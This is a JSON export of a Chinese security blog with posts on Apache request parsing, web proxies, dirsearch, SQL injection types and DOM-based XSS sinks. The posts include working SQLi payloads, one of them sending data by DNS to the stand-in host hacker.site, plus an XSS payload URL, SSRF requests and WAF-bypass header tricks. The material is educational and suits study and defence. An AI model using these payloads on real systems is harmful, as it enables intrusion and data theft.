{"meta":{"title":"turn1tup's bolg","subtitle":"","description":"","author":"turn1tup","url":"https://turn1tup.github.io","root":"/"},"pages":[],"posts":[{"title":"简析Apache如何解析HTTP请求","slug":"简析Apache如何解析HTTP请求","date":"2020-06-16T15:48:13.685Z","updated":"2020-06-16T15:48:13.677Z","comments":true,"path":"2020/06/16/简析Apache如何解析HTTP请求/","link":"","permalink":"https://turn1tup.github.io/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/","excerpt":"","text":"该文章写于 2019-10 引言之前看了看Apache是如何解析HTTP请求的，整理了一下笔记，说说其中的一些要点。 首先，在最新版本的Apache服务器http2.4.41中，似乎移除了对HTTP的许多“兼容特性”，这些特性是不符合RFC标准的，而笔者当时阅读的代码为2.4.3，本文记录了笔者在阅读代码时认为十分重要的一些解析细节。 read a lineApache读到LF字符时，就判断一行已经读完了。 before request line读取请求行时，会跳过blank line，默认为DEFAULT_LIMIT_BLANK_LINES 次 （limit_req_fields没有被初始化），奇怪的是在2.4.3源码中没有搜索到定义值，在2.4.41中倒是搜索到了。 Apache之所以会这样做，代码中解释说，浏览器在发POST请求时，会在末尾添加CRLF，如果形成一个pileline请求，request line前面就会有空行。 request line请求行默认长度最大为8190字节，请求行由三部分组成 method、uri、version。 在获取method 、uri的时候，需要判断是否空白字符，2.4.3使用isspace来判断是否空白字符。 内置method有26个，未被识别时返回UNKNOWN_METHOD（为啥phpstudy搭建的2.4.23 瞎写method都可以…） version没被解析成功的情况下，被设置为HTTP1.0 URI是如何解析的，没有看到具体代码，相应的函数是个钩子函数。 在URL路径中，即？前面的字符串中，如果存在畸形URL编码，如%fg，则直接返回400；如果存在0字符，则返回404 header filed每个头部默认长度最大为8190字节，头部个数最大默认为100 如果一个头部以SP或HT字符开头，表示该头部是上一个头部的extended，或者说是一个continue header line，该行将被合并到上一行，符合RFC。 请求域行中必须要有冒号 : 头部中的多个LWS字符会被跳过。 相同头部字段名的头部行将被合并，缓冲区大小不变 TETransfer-Encoding存在时忽略Content-Length TE头部的值必须为chunked must hostnamehttp 1.1必须要有host头部字段，否则返回400 当Content-Type不为空且前面33个字符值为application/x-www-form-urlencoded时，会将Body认为为表单，并以”&amp;”符号分割表单，“=”区分key value，并且会对二者都进行URL解码，详细代码冗长，就不贴出来了。 结语代码最后看下来，在HTTP解析这块，我们需要关注的要点不是很繁多，而C代码只以业务功能的视角来浏览的话，不难。 不过没有看到Apache解析multipart/form-data的代码；还有其他容器后续慢慢看吧。","categories":[],"tags":[]},{"title":"我所了解的WEB代理","slug":"我所了解的WEB代理","date":"2020-06-16T15:39:52.429Z","updated":"2020-06-16T15:39:52.429Z","comments":true,"path":"2020/06/16/我所了解的WEB代理/","link":"","permalink":"https://turn1tup.github.io/2020/06/16/%E6%88%91%E6%89%80%E4%BA%86%E8%A7%A3%E7%9A%84WEB%E4%BB%A3%E7%90%86/","excerpt":"","text":"该文章首发于安全脉搏 2018-08-22 https://www.secpulse.com/archives/74676.html 在这里，和大家聊聊我自己所知道的一些关于Web代理的知识。 WEB代理的类型Web代理，有普通代理和隧道代理两种，下面简单说说这两种类型。 普通代理该类型最为简单，代理服务器作为中间人，转发客户端的HTTP请求给目标主机，之后将目标主机的HTTP响应报文回送给客户端。 普通代理这里有个“小坑”，放到后面和大家说。 隧道代理首先，客户端向代理服务器发送HTTP请求，方法为CONNECT，表示请求代理服务器与目的服务器的特定端口建立TCP连接，之后代理服务器对客户端与目标服务器之间的数据进行盲转发。 具体如下图（《HTTP权威指南》第八章）： 假如我们为浏览器设置了WEB代理，在访问HTTPS类型网站时，会使用隧道代理的方式来进行访问；遇到HTTP类型网站，为了减小不必要的开销，浏览器则通常采用普通代理的方式来进行访问。 这里有篇文章，写得很详细： https://imququ.com/post/web-proxy.html 扫端口在渗透测试时，遇到某些WAF时，你会发现连扫端口都没法扫，而WEB扫描/暴力破解，在遇到有WAF时则可以通过Web代理服务器（大量）来进行绕过。于是笔者就幻想着有没有类似WEB代理的东西，能够解决扫端口时被WAF屏蔽的情况。起初我想了想，摇了摇头，“不可能，WEB代理服务器不是与HTTP协议相关吗，这是应用层的东西，扫端口的话，应该是传输层的东西” 现在想想也是好笑，当时都没搞明白Web代理具体是个什么样的东西，实现方法都有哪些。 其实，通过WebSocket代理就可以做到“通过代理进行端口扫描”，当然，该种情况下只能进行TCP端口的信息嗅探，而扫描的结果不只是端口是否存活，同样可以判别端口的服务类型。 原理十分简单。 第一步判断端口是否开放。 12CONNECT http:&#x2F;&#x2F;www.test.com:8080 HTTP&#x2F;1.1Host: www.test.com:8080 如果目标端口为开放的状态，会返回200；未开放的，代理服务器会返回503状态信息，大致分别如下。 1234HTTP&#x2F;1.1 200 Connection establishedHTTP&#x2F;1.1 503 Service UnavailableServer: squid&#x2F;3.3.8... 这里有一个很大的问题：很多代理服务器似乎对访问的域名/IP/端口做了一些限制，完全“开放”的websocket代理服务器数量上就可能更少了。之前笔者收集代理服务器都是通过对一些免费的网站进行爬取，这种收集到的代理在这种用途中的可用性惨不忍睹，选择收费的或是通过Shodan搜索Header中的关键字来进行收集整理或许是更好的方法。 在建立套接字后，有的服务会直接返回banner数据，这种情况下，直接选择接收下一个TCP包即可；有的就需要客户端这边发送些数据才能探测到关于该服务的信息；以及还有其他情况。笔者写了一个简单的py脚本，进行了一些测试，结果如下： banner信息在代理服务器返回状态码的时候就返回的情况： 脚本： https://pan.baidu.com/s/1U9MeVfrZgwDsq43EGTGYUA 到头想来，这样搞端口扫描成本太大了，目标得重要到啥程度啊。 一个小坑前阵子，笔者在写代码时，被这个坑了大半天，当时解决了这个问题，但还是云里雾里的。之后翻开《Web之困》，发现书中已有说明。 引用《Web之困》一书3.1.3小节中的一段话： GET http://www.fuzzybunnies.com/ HTTP/1.1Host: www.fuzzybunnies.com… 上述例子和普通的HTTP请求最大的语法差异，就是请求内容里的第一行，这时候是一个完整的URL，通过这项信息代理服务器才知道用户要连接的目标服务器在哪里。这项信息实际上有点多余，因为在Host请求头里也标识了主机名称；这种重复是因为这两套机制其实是相互独立发展起来的。为了避免客户端和服务器串通一气，如果Host请求头的信息与请求行里的URL不匹配时，代理服务器应以请求行里的URL为准，或者用特定的“URL-Host”数据对和缓存内容联起来，而不能只根据其中一项信息做出判断。 至此，笔者才恍然大悟，又回想起很久之前在浏览一些网站发生的“奇怪的事情”。有那么一两个网站，笔者在浏览器中进行访问是正常的，但用BurpSuit的Repeater去访问时却发生HTTP 400的情况，之后尝试把请求行中的URI改为完整的URL，访问就正常了，当时也不知道啥回事，没深究就这样过去了…由于问题复现不了，具体症结现在也理不清了，但很可能是Web代理引发的问题。问了一些朋友，有的遇到过，不过没解决。不知道同学们遇到过没。 反向代理反向代理，按照笔者的理解，客户端把反向代理服务器当作真正的后台服务器即可。反向代理服务接收到客户端的请求后，如有需要会向真正的后台服务器请求资源，并返回给客户端，而客户端无需感知这是不是一台反向代理服务器。 笔者问了一些渗透测试得朋友在工作中遇到反向代理这种情况，很多说太高大上了，基本没遇到。但笔者经常遇到啊…难道是他们没发现？(懵逼) 测试时，遇到一些网站HTTP响应报文的头部有Ngnix字样，则很可能存在反向代理，而要发现反向代理背后的服务器中间件类型也很简单，只要让后端服务器发送一些非200的响应报文就好，似乎反向代理服务器对非200的报文是直接返回的，这可能是配置问题。比如发送一些代理服务器觉得正常但后端服务器无法识别的报文，例如让后端服务器返回400。 123HTTP &#x2F;% HTTP&#x2F;1.1Host: www.test.com... 关于反向代理，有些地方很有意思。反代如果配置不当，就可能变为正代，然后就发生了内网漫游的安全问题。国外与国内都有类型的案例。贴两篇国内的文章： http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0191121.html （lijiejie) https://mp.weixin.qq.com/s/EtUmfMxxJjYNl7nIOKkRmA（ChaMd5） 把HTTP请求的URI改为完整URI形式即可测试，如： 123GET http:&#x2F;&#x2F;office.test.com HTTP&#x2F;1.1Host: www.test.com... 而lijiejie的漏洞POC比较有意思，他给出的POC是这样的（后来学习了更多的知识，笔者才知道这是Apache的一个SSRF漏洞） 123GET :@office.test.com HTTP&#x2F;1.1Host: www.test.com... 熟悉URL结构的同学们知道，:@在这里是指认证信息。而，lijiejie还额外删去了协议名称与分隔符scheme://，笔者也不知道其中具体原因，正常来说，只会返回400。而添加了认证信息的HTTP请求被代理服务器接收到后，会将认证信息取出，设置给Authorization header字段，如： 另外，笔者发现有些人的HTTP请求喜欢加上Authorization: Basic Og==头部字段，难道这里有什么猫腻吗… 协议类型scheme还可以更改为其他，诸如 ftp、gopher、file等，具体情况要看代理服务器的支持能力。 关于反向代理，还有一个比较有意思的地方。有些程序员为了降低服务的的带宽压力，在客户端发送HTTP POST 数据包之前，会将客户端请求体内的数据进行压缩，然后在头部指明压缩类型，如gzip，数据包类似下面这样 12345678POST &#x2F;index.php HTTP&#x2F;1.1Host: www.test.comContent-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8Content-Encoding: gzipContent-Length: 38...._.&#123;[...L.-....S(N.IM.Q0....0..... 当防火墙处于最外层，流量先经过防火墙后再经过反向代理，假如防火墙不支持解压HTTP Request的包体，或是无法识别该类型的压缩，则十分可能发生安全问题。 另外提一下，有些同学可能对URI与URL有点混淆，记住URL是URI的子集即可。 HTTP转发扩展RFC7239文档中说到，在很多情况下，用户网络中存在着代理，而这些代理又屏蔽了客户端的很多信息，诸如IP地址。所以文档提议增加X-Forwarded-For等字段，方便进行访问控制、诊断等。其中还说到，这些字段对反向代理也应起作用。 https://tools.ietf.org/html/rfc7239 在提供Web代理IP的网站上，我们可以发现其提供的代理存在匿名与非匿名两种，通过查看代理服务器的HTTP请求是否带有X-Forwarded-For字段即可判断代理是否匿名。很多代理是非开放的，需要认证信息Proxy-Authorization 关于代理转发扩展，除了X-Forwarded-For该种的，还有很多，比如 1234X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1X-Client-IP: 127.0.0.1 除了X-Forwarded-For，其他都是非标准字段。在BurpSuit插件商店中，有款名为Bypass WAF的插件，能让Burp的所有请求自动添加这些头部字段，还做了其他很多扩展，感兴趣的同学可以看看。 https://www.codewatch.org/blog/?p=408 结语刚刚接触HTTP时，Web代理的相关知识一直获取到的不多，后来慢慢发现其实还是很重要的。这篇文章也是对自己在web代理知识方面的一个小结，由于笔者水平有限，如果有错误的地方，欢迎大家指出。","categories":[],"tags":[]},{"title":"读dirsearch有感","slug":"读dirsearch有感","date":"2020-06-16T15:34:37.637Z","updated":"2020-06-16T15:34:37.637Z","comments":true,"path":"2020/06/16/读dirsearch有感/","link":"","permalink":"https://turn1tup.github.io/2020/06/16/%E8%AF%BBdirsearch%E6%9C%89%E6%84%9F/","excerpt":"","text":"该文章写于 2019-3 读dirsearch有感最近开始阅读一些优秀的开源项目，读完之后就顺手写写读后感吧，今天说说dirsearch，开头嘛，先读个简单点的，哈哈。 1.解决Debug程序参数是从命令行获取的，而debug模式则是将一个py脚本作为程序入口的，笔者开始有点不知所措，突然临机一动，用下面这个代码不就解决了？ 1234import dirsearchimport syssys.argv &#x3D; [&#39;dirsearch.py&#39;, &#39;-u&#39;, &#39;http:&#x2F;&#x2F;192.168.1.55&#39;, &#39;-e&#39;, &#39;jsp&#39;, &#39;--proxy&#39;, &#39;http:&#x2F;&#x2F;127.0.0.1:18080&#39;, &#39;-w&#39;, &#39;db&#x2F;dicc_test.txt&#39;]dirsearch.Program() 2.简说程序dirsearch是一款使用python3编写的，用于暴力破解目录的工具，其README有写到下面一点 Heuristically detects invalid web pages（启发式地检测无效web页面） 在读程序之前，我带着下面几点疑惑/好奇 1.它是如果做到”启发式“这一点的； 2.其线程方面的代码，是否有什么亮点； 3.有啥比较骚的功能不。 2.1 dirsearch的启发式从底层核心类开始说起。首先是Scanner，主要用于分析并存储当前网站对各类无效目录/无效文件真正的HTTP Resonse的模式。 Scanner在测试时，使用的路径/文件是一个包含12个随机字符的字符串，如68yK0OccrHpt、68yK0OccrHpt.php 1self.testPath &#x3D; RandomUtils.randString() 有的网站系统，对请求无效WEB页面的HTTP Request，返回的是200的状态码，当然，界面是一个友好界面；有的网站则会返回一个301/302/307的跳转。 当Scanner访问这些随机字符串路径时，如果服务器返回的状态码是404，则Scanner不继续分析，直接返回；服务器返回的状态码不是404，Scanner会发送第二次请求，依然是随机字符串的路径/文件，之后分析两次Response Body的相似度并保存该相似度的浮点值，如果两次Response都发生了跳转（301/302/307），那么还会为Location字段值（URL）生成一个正则，如下面所示。 12345678910111213141516171819202122from difflib import SequenceMatcherimport redef generateRedirectRegExp(firstLocation, secondLocation): if firstLocation is None or secondLocation is None: return None sm &#x3D; SequenceMatcher(None, firstLocation, secondLocation) marks &#x3D; [] for blocks in sm.get_matching_blocks(): i &#x3D; blocks[0] n &#x3D; blocks[2] # empty block if n &#x3D;&#x3D; 0: continue mark &#x3D; firstLocation[i:i + n] marks.append(mark)&gt;&gt;generateRedirectRegExp(&quot;http:&#x2F;&#x2F;www.test.com&quot;,&quot;http:&#x2F;&#x2F;123.test.com&quot;))&gt;&gt; ^.*http\\:\\&#x2F;\\&#x2F;.*\\.test\\.com.*$ 之后访问一个目录/文件时，发生跳转中的Location的值需要匹配该正则，也页面相似度不小于当前值时，该目录/文件才被认为是无效的。可以说，dirsearch在这里做得很细致啊。 Scanner是被Fuzzer创建并调用的，Fuzzer为无后缀斜线目录（/dir）、有后缀斜线目录（/dir/）、用户指定扩展文件（/xx.php、/xx.jsp等）分别创建了一个Scanner，Scanner在执行setup()函数时，会如本节开头所说的，会分析出该种目录/文件的无效目录/无效文件所对应的HTTP Response的模式。 2.2 dirsearch的多线程有人说dirsearch速度很快，笔者以为在多线程方面会有亮点，比如说用协程，但并没有啥亮点。 虽然有GIL这东西然人感到不舒服，但也习惯了用threading，编写起来也快，笔者想着下一个项目还是得要求自己用用协程。 2.3 dirsearch的迭代遍历–recursive用于递归目录遍历，默认是关闭的，而设置该选项时，还可以设置–exclude-subdi排除不想做迭代的目录。 在Controller中设置了matchCallbacks函数，该函数会将当前有效的不在exclude中的目录添加到当前 123self.fuzzer &#x3D; Fuzzer(self.requester, self.dictionary, testFailPath&#x3D;self.arguments.testFailPath, threads&#x3D;self.arguments.threadsCount, matchCallbacks&#x3D;matchCallbacks, notFoundCallbacks&#x3D;notFoundCallbacks, errorCallbacks&#x3D;errorCallbacks) 在测试该功能时还发现了一个BUG，已经提交至Issues。问题的来源是这样的，Requester中有这样一行代码 1url &#x3D; urllib.parse.urljoin(url, self.basePath) 但是，这个urllib库者urljoin函数有点问题。 123&gt;&gt;&gt;from urllib import parse&gt;&gt;&gt;parse.urljoin(&quot;http:&#x2F;&#x2F;192.168.237.136&quot;,&quot;&#x2F;&#x2F;admin&#x2F;&quot;)&gt;&gt;&gt;&#39;http:&#x2F;&#x2F;admin&#x2F;&#39; 笔者提交的修补代码是。 12345while True: path_tmp &#x3D; self.basePath.replace(&#39;&#x2F;&#x2F;&#39;, &#39;&#x2F;&#39;) if path_tmp &#x3D;&#x3D; self.basePath: break self.basePath &#x3D; path_tmp 比较郁闷的一点时，dirsearch对待wordlist中结尾有“/”的，且该目录在当前目标URL中为有效时才会进行迭代遍历，比如 访问http://www.test.com/admin 时的 HTTP Response状态码为200 ，dirsearch不会对该目录进行迭代遍历，访问http://www.test.com/admin/ 时的 HTTP Response 状态码200，dirsearch会对该目录进行迭代遍历。为啥要把选择权交给wordlist，作者为啥要做这种区分，吾不知所以然啊。 2.4 IP选项在渗透测试时，有时候做目录遍历时，不得不只能能用BurpSuit，不知道同学们对此是否有所体会。其中的痛点需求是，我们希望底层的Socket连接的是一个指定的IP，然后HTTP中的Host字段值则是另外一个指定的域名/IP。 dirsearch就很巧妙地解决了以上痛点需求。requests传入的URL中的host值是来源于-ip,另外设置Headers中的Host字段值为–url中的值。 3.不足之处3.1笔者十分在意的另外一点是，dirsearch在扫目录时，没有主动区分”/dir”、“/dir/”，这两类目录（当然，前文也说了，作者把这两类作为是否迭代遍历的标志）。笔者的意思是，有时候，访问“http://www.test.com/admin”，HTTP Response状态码为301；访问“http://www.test.com/admin/“，HTTP Response状态码为404。所以笔者十分在意这一点，这也是一个痛点啊，dirsearch并没有对此做一个主动性的区分。 3.2还有一点可能有点吹毛求疵了，在读取字典时，不能将一个目录作为读入点。 结尾，dirsearch的启发式识别URL是否有效确实挺不错的，可能是不同人有不同的想法，所以项目的一些地方会让笔者感到疑惑不解，而项目的整体逻辑也挺不错，适合像笔者这样的初学者好好看，好好学。本文也作为笔者的备忘录 展开全文 &gt;&gt;","categories":[],"tags":[]},{"title":"SQL注入类型详解","slug":"SQL注入类型详解","date":"2020-06-16T15:33:56.365Z","updated":"2020-06-16T15:33:56.365Z","comments":true,"path":"2020/06/16/SQL注入类型详解/","link":"","permalink":"https://turn1tup.github.io/2020/06/16/SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3/","excerpt":"","text":"该文章首发于信安之路（2018-01-25） https://mp.weixin.qq.com/s/BQVS7alMSdy3_SQuMymkug 笔者最初学习 SQL 注入时，大家对于 SQL 注入类型的归类让我头脑一片混乱，后来笔者发现其实大家都是根据 sqlmap 上给出的“类型”来划分的。所以，今天在这里，笔者根据自己所学所知来对 SQL 注入进行一个分类，以及讲解一些在注入时十分重要而有用的知识，相信对初学者十分有用。 本文主要使用 MySQL 来进行讲解，且重点是对整个 SQL 注入类型的探讨，以及在这些注入类型中的一些重要细节的讲解，所以不会过多讲解 SQL 语句具体语法语意等。 我们知道，Sqlmap 有个参数可以直接指定注入时所用的类型： --technique=BEISTQU [ Boolean-based blind, Error-based queries, Inline queries, Stacked queries, Time-based blind, UNION query ] 但从实际的逻辑思路上来说，这样划分是难以理解的，BEUSTQU 是注入方式，和类型其实没有什么关系，理解这点很重要。 在说 SQLI 时，首先要注意的一个要点就是判断注入位置的参数属性类型。注入位置的参数属性类型有整形和字符型，区分二者的真正意义是，整形参数之后跟的语句不必”打破变量区”，即我们在这里输入字符即可被作为 SQL 语句的一部分了。有的时候 web 开发者仅对用户输入进行了转义，而没注意一些整形参数的处理，在这种情况下就可以直接注入了。 第二个要点就是，注入时所用的 HTTP Request 报文类型，是 GET、POST 或其他。 第三个要点就是，注入点在 HTTPRequest 报文中的位置所在。如 HTTP 报文的头部字段，包括 Cookie、User-Agent 等，也可能发生 SQL 注入，如开发者记录用户浏览器类型到数据库，这个时候使用的是 User-Agent 头部字段，如果开发者十分大意，可能就发生注入了。 sqlmap 等级 2 会检测 Cookie，等级 3 会测试 User-Agent、Referer，等级 5 会检测 host。 First order Injection第一大类型，由于都是翻译的，笔者更喜欢叫它一级注入。一级注入发生在应用与用户交互的地方，web 应用获取到的用户的信息都可能发生注入 In-band SQLi第一大类型中的第一个类型叫“带内 SQL 注入”，就是说攻击者可以直接与受害主机发生交互，面对面一样的。有人比喻成，攻击者与受害服务器之间有一条“信息通道”，通过这条通道攻击者可以获取到想要的信息。 Union Select SQLi （直接回显） 联合查询 SQL 注入，这是最简单的注入类型，通常在通过 order by 判断 SQL 语句查询结果的列数后，使用 union select 或其他语句来直接查询数据，数据直接回显。 可以根据下面的语句来理解该类型注入： Error-basedSQLi 中文为 “报错型 SQL 注入”，攻击者不能直接从页面得到他们的查询语句的执行结果，但通过一些特殊的方法却可以回显出来，带有一点盲注的味道。报错型注入，一般是通过特殊的数据库函数引发错误信息，而错误的回显信息又把这些查询信息给泄漏出来了。 Mysql 的报错函数有12种之多（只是看过然后收集，并无验证），但实际上可能只需要熟悉两三种即可，对过 WAF 可能会有帮助。下面列出我常用的两种方法： 1、extractvalue 函数。 语句跟在 AND/OR/||/&amp;&amp; 后面 or 1 and extractvalue(1, concat(0x3a, (select @@version),0x3a)) 还有下面的骚操作，注入点发生在 sql 语句的 limit 整形参数里，可以直接跟在整形参数后面（来自 hackinglab） ?start=0 procedure analyse(extractvalue(rand(),concat(1,(select @@version))),1) 2、rand+count 函数，与 union 结合，与 AND/OR/||/&amp;&amp; 结合都可以，十分灵活。 union select count(),concat(0x3a,0x3a,(select @@version),0x3a,0x3a,floor(rand()2))a from information_schema.columns group by a; AND(select 1 from (select count(),concat(0x3a,0x3a,(select @@version),0x3a,0x3a,floor(rand()2))a from mysql.user group by a)b) Blind SQLi ( Inferential SQLi ) 盲注也叫逻辑推理注入，在这里，攻击者不能得到数据库错误的回显信息，也不能得到查询结果的回显信息，但可以通过其他信息来进行逻辑推理从而获取数据。 1Boolean-basedSQLi 布尔型注入，构造一条布尔语句通过 AND 与前面进行逻辑上的连接，当这条布尔语句为真时，页面应该显示正常，当这条语句为假时，页面显示不正常或是少显示了一些东西。值得注意的是，在实际中，布尔值假时的表现可能为 HTTP 500，真时的表现为 HTTP 200，以及还有其他各种情况，这也是逻辑推理的真谛。 还有一些细节值得注意，计算机语言的逻辑判断中，通常 AND 的优先级大于 OR，且对布尔值判断时，如果 or 的左边为真时，右边是不会执行的，而对于 AND，如果左边布尔值为假，右边也会跳过而不会执行。 MySQL 有点神奇，似乎对它不影响，但是我们还是要养成好习惯；而在 mssql 与 oracle 这是要注意的，具体如下图： 使用布尔型盲注来获取 MySQL 数据库数据，如查询数据库名的第一个字节的 ASCII 码十进制值是否大于 100，有如下语句： and ascii(substr(database(),1,1))&gt;100 或是使用 like 的方法： and substr(database(),1,1) like ‘m’ and substr(database(),1,2) like ‘my’ 还可以使用“突破延迟注入”的方法，因为延迟注入与布尔型注入本质上是一样的，所以这个方法在这里也可以使用，如有兴趣可以查看 FreeBuf 的公开课。 还要说明一个重要的问题，PHP 与 MySQL 都是弱类型语言，在 MySQL 中你可以有 select passwd from users where username=’xx’ or 1 但是在 MSSQL、Oracle 中是 select passwd from users where username=’xx’ or 1=1 好好体会思考 MySQL 的“弱”。 1Time-based SQLi 延迟型盲注，原理大致如下，当一个查询结果为真时，则让对端数据库等待一定时间返回，否则立即返回，等待的表现是浏览器未刷新，对端服务器未应答。 MySQL、MSSQL 下，当查询结果为真时利用时间函数来进行休眠，而 Oracle 没有时间函数，所以 Oracle 下会通过查询大表、大数据来达到同样的目的，MySQL 下有： and if(ascii(substr(database(),1,1))&gt;100,sleep(10),null) 逻辑推理注入是十分花费时间的，不得不靠工具或是小脚本来完成。Sqlmap 中，可以通过 –technique t，直接指定基于时间的盲注来跑。 Out-of-band SQLi带外数据（OOB）的这种攻击方式，在各种盲攻击中都有此概念，如在 XXE 盲注。笔者对 OOB 型 SQL 注入的理解是，在 SQL 注入攻击中，攻击者的 Payload 代码成功执行了，但由于各种因素所致，结果无法通过 HTTP Response 来答复攻击者的 HTTP Request，攻击者也就无法从这种“信道”获取 payload 产生的数据。而 OOB 中，攻击者通过构造特殊的 Payload，让受害主机向指定主机发送 HTTP 请求或 DNS 查询，而这些请求报文中携带了查询结果的数据。 如 MySQL 下有： select load_file(concat(‘\\\\‘,version(),’.hacker.site\\a.txt’)); 具体 DNS 查询报文如下图： Second order Injection第二大类型就是二级注入了。通常网站开发者可能会十分注意与用户发生交互的地方，自然这些地方就很少会有 SQL 注入漏洞了。而开发者对从数据库查询出来的信息可能十分信任，而这就是攻击者的机会所在——即便从数据库查询出来的数据也不是可靠的。 在 sqli-labs 的 24 关中，我们在在注册一个用户名为 &#39;admin&#39; or &#39;1&#39;=&#39;1 之后，使用该用户登录，并修改该用户的密码为 123，可以发现，用户 admin 的密码被修改为 123 在重置密码时，使用的 SQL 语句是： UPDATE users SET PASSWORD=’$pass’ where username=’$username’ and password=’$curr_pass’ 由于变量 $username 的值时从数据库中查询出来，开发者并没有对其进行过滤处理，所以产生了 SQL 注入。我们在修改密码时实际上修改的时 admin 帐号的密码。 补充Stacked queries 堆叠查询是指在一次数据库语句查询中，可以同时执行多条语句。如下面例子，我们在一次 MSSQL 数据库注入中同时执行了两条语句： select username from usertable where passwd=’123’;waitfor delay ‘0:0:5’ –%20 而堆叠查询本质上还是使用的其他注入方法，只不过堆叠查询的结果无法直接回显，通常在堆叠查询中我们可以尝试使用延迟注入、OOB 等方法来获取数据。 关于堆叠查询的发生前提情况具体可以参考下图： 通过在堆叠查询中使用存储过程还可以绕过 WAF。这篇文章就是很好的例子： http://www.freebuf.com/column/145771.html Inline Queries Sqlmap 作者给这种注入起了个这个名字或是说使用了这个名字，中文翻译过来刚刚好和内联查询（Inner Join） 冲突了，笔者也是懵逼了很久。后来经过一番查阅，才知道这个 Inline Queries 指的是内联视图（Inline View）。内联视图能够创建临时表，在处理某些查询情况时十分有用。 假如有 User_Address 表，里面有用户邮编 ZIP_CODE，而另外一张表 User_Score，则记录的每个用户的分数，且这两张表有相同的列 “User_ID”。 如果我们想找出得分超过 200 的用户的邮编时，利用内联视图可以一句话就搞定，具体如下： 可以参考 SQL Inline View https://www.1keydata.com/sql/inline-view.html 进行学习。 在 Sqlmap 的 boundaries.xml 文档中的 clause 标签说明中，作者给出了他们认为 SQL 语句存在注入点的 10 种情况，如下： 而 Inline Queries SQLI 有 1、2、3、8 共四种情况，笔者尝试使用 Sqlmap 来对 MySQL 的 Inline Queries 语句进行注入，发现 Sqlmap 识别出的注入方式并不是 Inline Queries，而其源码中确实有该种注入的 Payload，笔者也未曾遇到过该种注入，对此也只能表示疑惑了。 总结这篇文章的大体轮廓在笔者学完 SQL 注入一个星期后就开始写了，当时的笔者十分恼火，为什么找不到一篇能够帮笔者理解 SQL 注入类型的文章，所以决定自己参悟并写一篇。又经过一番学习一番修改，这篇文章就出炉了，起初想加入一些“高级点”的东西，但是和文章标题不符合，就算了，有机会再补上吧。希望本文对大家有所帮助，谢谢！","categories":[],"tags":[]},{"title":"DOM型XSS的三个接收器","slug":"DOM型XSS的三个接收器","date":"2020-06-16T15:30:16.409Z","updated":"2020-06-16T15:30:16.409Z","comments":true,"path":"2020/06/16/DOM型XSS的三个接收器/","link":"","permalink":"https://turn1tup.github.io/2020/06/16/DOM%E5%9E%8BXSS%E7%9A%84%E4%B8%89%E4%B8%AA%E6%8E%A5%E6%94%B6%E5%99%A8/","excerpt":"","text":"DOM型XSS的三个接收器 翻译 原文链接 https://brutelogic.com.br/blog/dom-based-xss-the-3-sinks/ 前言最常见的XSS是基于源的（普通XSS），这意味着被注入的JavaScript代码被传输到服务器后又传输到客户端，并在客户端这里被执行。但还有另外一种主要类型————DOM型XSS，被注入的恶意代码的输入来源，与服务器无关，DOM型XSS既不是反射也不是存储：该种XSS是由客户端的原生JavaScript代码产生的。DOM型XSS与基于原码的XSS（普通XSS）十分相似，所以它也被归纳为反射型XSS和存储型XSS的子类。当浏览器通过JS引擎与本地端的存储，提供反射/存储机制时，DOOM型XSS与基于原码的XSS就基本没有什么区别了。然而，不同于简单的请求/响应模型，想要发现DOM型XSS，可能需要对代码进行大量分析。而通过静态甚至是动态的分析工具，都难以发现DOM型XSS漏洞。 源与接收器（Sources and sinks）DOM（文档对象模型）是由服务器传输过来的HTML文档与JavaScript代码生成的。也许你知道，JavaScript代码以脚本块和/或导入库的方式嵌入到HTML文档中。通过将所有HTML元素转换为对象后，我们可以通过JavaScript对其进行操作，即便是在浏览器运行期间的也可对其进行更改。 XSS的触发逻辑，在服务端与客户端下都是一样（普通与DOM型）：我们需要找到相应的输入点与输出点。例如，在PHP服务端中，我们通常认为$_GET[&quot;var&quot;]或$_POST[&quot;var&quot;]这些是输入点，而echo或print这些命令是输出点，这也构成了XSS触发的条件。 在客户端源这边，我们有源与接收器（sources and sinks）。源指的是DOM对象的众多属性，比如document.location,document.referer,window.name 甚至还有url参数（在处理后）这好比服务端的XSS。该列表非常庞大，因为HTML所有的内容都能被JavaScript所操作，并成为潜在的接收源（source of sinks）。 因此，为了让我们更容易研究基于DOM的XSS，我们先来看看接收器，因为只有3个主要情况。下面是一个演示它们的页面。如果你对XSS有足够的经验或者只想训练自己，请立即停止阅读，并按照#hack2learn原则对其进行XSS。 12演示界面：https:&#x2F;&#x2F;brutelogic.com.br&#x2F;tests&#x2F;sinks.html 三个接收器在我们的演示页面中，我们有如下的源码： body中只有一个p元素，这个元素被该页面下的JS代码动态更新，这里并没有导入，也没有使用库。源码中通过三行注释分别标记出了三个示例，分别标记每个案例的代码片段的起始位置。 在第一个案例文档接收器（Document Sink）之前，该代码通过API来处理URL参数的值：在获取document.location.search属性之后，我们创建一个实现了URLSearchParams的对象。 文档接收器 （DOCUMENT SINK）在文档接收器中，本机JavaScript代码使用受攻击者控制或提供的数据来更新当前文档。它可以在DOM中插入带有JS代码的全新HTML标记或是一个新的带有JS代码事件的属性。 URL参数name的值被存在username变量中，以便稍后用于更新文档。如果该变量不为null，则使用字符串Hello拼接URL中name参数的值来更新p元素。这使得攻击者可以插入HTML代码： 1https:&#x2F;&#x2F;brutelogic.com.br&#x2F;tests&#x2F;sinks.html?name&#x3D;&lt;img+src+onerror&#x3D;alert(1)&gt; 需要注意的是，经典的&lt;script&gt;alert(1)&lt;/script&gt;不起作用。还有其他几个XSS向量也如此，因为它是一个DOM插入而不是简单的源反射。只有少数情况下，上面的payload才会有作用。 文档接收器可以以多种方式出现：使用innerHTML和outerHTML元素属性，使用document.write()，document.writeln()函数以及JavaScript库提供的任何其他方式来更新元素或文档。 位置接收器（LOCATION SINK）在位置接收器中，本机JavaScript代码使用受攻击者控制或提供的数据更新文档的位置。通过这种方式，可以使用现代浏览器的一个有趣功能：JavaScript伪协议。 通过获取redir参数的值，上面的代码可以将浏览器重定向到另一个地址，加载另一个文档。在跳转后的地址站点中攻击目标应用程序是没有用的，因为我们脱离了上下文。 但是通过使用JavaScript伪协议，这是一种将JavaScript代码直接运行到浏览器地址栏中的方法，可以在当前文档中运行JS代码。 